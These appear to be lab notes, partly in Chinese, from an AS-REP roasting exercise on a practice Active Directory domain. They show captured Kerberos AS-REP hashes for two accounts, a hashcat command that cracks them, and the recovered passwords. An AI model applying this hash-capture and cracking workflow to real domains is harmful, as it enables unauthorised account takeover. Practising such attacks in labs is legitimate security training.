      847ADF96B0A8377A1DDAF1E1E709F58FF67C6EE89F0E24ECCE04B786BAEEA3ABB56E39389125D02E
      9F32819AE16F984BB5BC10B7C9B85D36AB80D017F3ED6FFC4B693198A13A8BA34ACED935E2AFC06D
      BACEFF847F52D66BF6561092EB9519F70E6E4EBCFF42F6D95801BB43E8EBD9EC0569653C5823A1BA
      1506B1EC1A92CFCEB98C523DE32F8E394C3F7E30CCBC1C38A2E2EDA7DFA08E857E0ACD0B2C0B1B2A
      EC84390A630CEAE3358360C5F540E5AFAA25A44ADD8D60D95C8068A72E238368E7CDA5729D1D80C5
      F9DCAA80F784B4518AE71CC35B4B11B1E90DF14D14FA64F38E588707B8BFAA907F5D699F6D1



# 整理hash
$krb5asrep$23$Admin2@CONTROLLER.local:6A2760CC8B06C463B9B10F4A59BBED69$6524BF9E91A37BE278E0A98DFF812ED5CFA07CF26CF25ECA5C5735FEC8B5EC2371164329EA5529988B76E35284C11DB0A8B8E4CA574908E7E724CA980E0C96FD8A80B87D0D22B49C255E49D6E9A7FF7672D3FBA6736EF491B231B18E98ECD4B3712AF950C39BBEDE40CC9C88172F80A038C176A5C44A82F4639C7F95AB1F92F40114C3ED4D5D3109652A09C1DCC95672F785F94033A404D3E39BF1F44C39BF6FF16605052E6293ABB5DFBBA9A44A352CC4FE447A3CF73B5D17D8872848429EA1E99A9543E4C0603C2F0A4FE30E18B64DE7E613CD9944EE2D834AF78BBC64993C8FEEACBB5F75399D699F7489BE829B3246277656


$krb5asrep$23$User3@CONTROLLER.local:624083767E314BB9956FFED0AF7F3CB9$33D6C03F601A4847ADF96B0A8377A1DDAF1E1E709F58FF67C6EE89F0E24ECCE04B786BAEEA3ABB56E39389125D02E9F32819AE16F984BB5BC10B7C9B85D36AB80D017F3ED6FFC4B693198A13A8BA34ACED935E2AFC06DBACEFF847F52D66BF6561092EB9519F70E6E4EBCFF42F6D95801BB43E8EBD9EC0569653C5823A1BA1506B1EC1A92CFCEB98C523DE32F8E394C3F7E30CCBC1C38A2E2EDA7DFA08E857E0ACD0B2C0B1B2AEC84390A630CEAE3358360C5F540E5AFAA25A44ADD8D60D95C8068A72E238368E7CDA5729D1D80C5F9DCAA80F784B4518AE71CC35B4B11B1E90DF14D14FA64F38E588707B8BFAA907F5D699F6D1

# 破解密码
hashcat -m 18200 hash.txt Pass.txt

Admin2 密码：P@$$W0rd2
User3 密码：Password3